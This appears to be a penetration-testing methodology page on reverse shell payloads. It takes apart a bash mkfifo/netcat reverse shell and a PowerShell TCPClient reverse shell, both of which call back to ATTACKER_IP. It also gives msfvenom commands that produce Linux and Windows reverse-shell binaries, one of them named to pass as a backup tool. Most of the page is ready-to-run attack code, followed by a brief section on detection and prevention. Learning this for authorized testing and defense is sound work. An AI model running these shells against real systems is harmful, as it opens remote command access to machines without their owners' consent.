---
layout: page
title: "Payload Basics"
subtitle: "Reading what a reverse shell payload does and generating stageless or staged payloads with msfvenom"
permalink: /methodology/shells-and-transfers/payload-basics/
---

**Purpose:** understand the mechanics of a shell payload well enough to pick, adapt or troubleshoot one, and generate a payload with msfvenom that matches the target platform.

## Workflow

1. Confirm the target platform and architecture (Linux or Windows, x86 or x64).
2. Confirm which interpreters are available on the target, such as bash, PowerShell or Python.
3. Choose a staged or stageless payload based on stability needs.
4. Generate the payload with the correct LHOST, LPORT and output format.
5. Start the matching listener, then deliver and run the payload.

## Anatomy of a bash reverse shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 7777 > /tmp/f
```

- `rm -f /tmp/f;` removes any leftover pipe, and `-f` suppresses the error if it is absent.
- `mkfifo /tmp/f;` creates a named pipe that acts as a return channel.
- `cat /tmp/f |` feeds whatever we type from the listener into the next command.
- `/bin/bash -i 2>&1 |` starts an interactive shell and merges standard error into standard output.
- `nc ATTACKER_IP 7777 > /tmp/f` connects back to us and writes the shell output into the pipe, closing the loop.

## Anatomy of a PowerShell reverse shell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- `powershell -nop -c` starts PowerShell without a profile and runs the quoted command.
- A `TCPClient` object opens the socket to the attack host.
- A 64 KB byte buffer receives incoming data in a loop.
- Received bytes are decoded as ASCII and passed to `Invoke-Expression`, and output is captured.
- The prompt string (`PS <path>>`) is appended to the output, and the result is written back to the socket.

## Generating payloads with msfvenom

List available payloads:

```bash
msfvenom -l payloads
```

Stageless Linux payload, saved as an ELF binary:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf > createbackup.elf
```

Windows payload, saved as an EXE:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe > payload.exe
```

## Staged versus stageless

| Type | How it delivers | When to prefer it |
|---|---|---|
| Staged | Sends a small first stage, which then pulls the rest of the payload | Smaller initial footprint, but depends on a stable connection |
| Stageless | Sends the complete payload in one transfer | When staged shells drop or behave unpredictably |

> The msfvenom output above reports the format and size of the result. Check the payload size against the delivery method, since some vectors have strict size limits.
{: .info }

## What to look for

- The platform and architecture reported by msfvenom. If none is given, msfvenom chooses defaults that may not match the target.
- The LHOST reachable from the target, not the attack host's internal or VPN address when those are unreachable from the target network.
- A listener on the same port and payload type as the one generated.

## Pitfalls

- A payload built for x86 will not run on an x64-only target, and the reverse is not always true. Match the architecture.
- `LHOST` must be an address the target can route to. Using the wrong interface (for example, a local loopback) produces a silent failure.
- Staged payloads can fail on unstable links. Switch to a stageless payload to test that theory.
- Confirm that the listener is listening before running the payload.

## Defense and prevention

Endpoint protection and application allowlisting often detect generic reverse shell payloads by signature or by behaviour, such as a process that opens a socket and spawns a shell. Egress filtering and command-line logging make these payloads easier to spot.
